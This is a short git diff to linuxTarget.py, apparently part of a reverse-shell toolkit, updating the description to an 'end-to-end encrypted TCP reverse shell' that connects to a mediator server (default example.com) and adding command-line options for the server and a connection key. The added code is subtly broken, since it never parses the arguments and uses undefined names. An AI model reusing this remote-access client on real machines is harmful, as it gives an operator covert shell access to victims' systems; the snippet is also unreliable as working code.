@@ -1,8 +1,7 @@
 #/usr/bin/python3
 """
 Program: linuxTarget.py
-Author: C.J. May
-Description: Basic TCP reverse shell -- to be used with mediator.py server to be bridged to the reverse shell operator client connection
+Description: End-to-end encrypted TCP reverse shell -- connects to mediator server to be bridged to the reverse shell operator client connection
 """
 
 from Crypto.Cipher import AES
@@ -81,6 +80,13 @@ class LinuxRShell:
 
 
 if __name__ == "__main__":
-    rShell = LinuxRShell(mediatorhost="example.com")
+    parser = argparse.ArgumentParser(description="")
+    parser.add_argument("-c", "--connection-key", dest="connectionKey", action="store")
+    parser.add_argument("-s", "--server", dest="serverAddr", action="store",
+                            default="example.com")
+    if connectionKey:
+        rShell = LinuxRShell(mediatorhost=serverAddr, connectionKey=connectionKey)
+    else:
+        rShell = LinuxRShell(mediatorhost=serverAddr)
     rShell.run()
 
